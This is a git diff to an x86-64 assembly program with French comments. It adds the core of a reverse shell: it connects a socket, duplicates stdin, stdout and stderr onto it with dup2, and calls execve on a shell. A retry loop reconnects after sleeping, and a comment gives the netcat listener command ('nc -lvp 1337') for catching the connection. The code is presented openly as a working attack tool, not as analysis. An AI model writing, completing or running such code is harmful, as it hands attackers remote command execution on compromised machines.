@@ -15,6 +15,7 @@ extern dup2
 
 ;nc -lvp 1337 = ecoute sur le port 1337
 
+
 section .data
     sockaddr:
         dw 2    
@@ -23,9 +24,11 @@ section .data
         dq 0
 
     msg:
-        conn_test_msg db "connection etablie", 0
+        conn_test_msg db ">> Connexion vers machine", 0
         conn_test_msg_len equ $ - conn_test_msg
 
+        sock_init_msg db ">> Socket initialisation", 0
+        sock_init_msg_len equ $ - sock_init_msg
 
         socket_err_msg db "socket initialisation error", 0
         socket_err_msg_len equ $ - socket_err_msg
@@ -60,8 +63,13 @@ section .bss
 section .text
 
 _start:
-    .connection:
+.connection:
+    mov rdi, 2
+    mov rsi, msg
+    mov rdx, sock_init_msg_len
+    call write  
 
+    ;socket creation
     mov rax, 41
     mov rdi, 2
     mov rsi, 1
@@ -82,12 +90,35 @@ _start:
     mov rsi, msg
     mov rdx, conn_test_msg_len
     call write
+
+    mov rsi, 0
+.redirection:
+    mov rdi, [sockfd]
+    call dup2 ; duplication du fd
+    inc rsi
+    cmp rsi, 3
+    jne .redirection ;si erreur redirection
+ 
+    ;creation reverse shell
+    lea rdi, [rel shell]
+    lea rsi, [rel argv]
+    lea rdx, [rel env]
+    call execve
+    ;si erreur alors sleep
+
+.error: ;gestion erreur 
+    mov rdi, 2
+    mov rsi, create_shll_err_msg
+    mov rdx, create_shll_msg_err_len
+    call write
     
+    mov rdi, 0
+    call exit
+
     
-    .sleep:
+.sleep:
     lea rdi, [rel timespec]
     mov rsi, 0
     mov rax, 35
     syscall
     jmp .connection ;si erreur alors recommence
-
